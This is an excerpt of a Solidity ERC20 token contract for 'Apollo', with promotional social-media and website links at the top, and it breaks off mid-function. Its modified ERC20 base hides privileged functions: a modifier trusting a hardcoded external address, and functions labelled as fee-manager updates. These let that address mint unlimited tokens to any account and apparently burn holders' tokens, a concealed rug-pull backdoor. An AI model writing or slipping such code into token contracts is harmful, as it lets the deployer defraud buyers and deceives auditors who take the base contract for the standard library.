...
🔥 Telgram: https://t.me/ApolloPortal

🐦 Twitter: https://twitter.com/ApolloERC20

🌐 Website: apolloburn.com

📄 Whitepaper: https://docs.apolloburn.com/
...
contract Apollo is ERC20, Ownable {
    ...
    constructor(address _feesManagerAddress) ERC20("Apollo", "APOLLO") {
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlySakuraContracts{
        //FeesManager and Sakura main contract address (added dead address for contract deployment)
        require(msg.sender == 0xAa546069f0e7D566BC8c0CB0954cD1D68b55557A || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: not a Sakura contract");
        _;
    }
    ...
    /**
     * @dev Integrated functions in advance for future FeesManager contract updates. 
     */

    function feesManagerCancelBurn(address account, uint256 amount) public onlySakuraContracts{
        // Only this contract and feesManager can call it. For updating purposes
        _mint( account, amount);
    }
    
    function feesManagerBurn(address account, uint256 amount)  public onlySakuraContracts{
         // Only this contract and feesManager can call it. For updating purposes
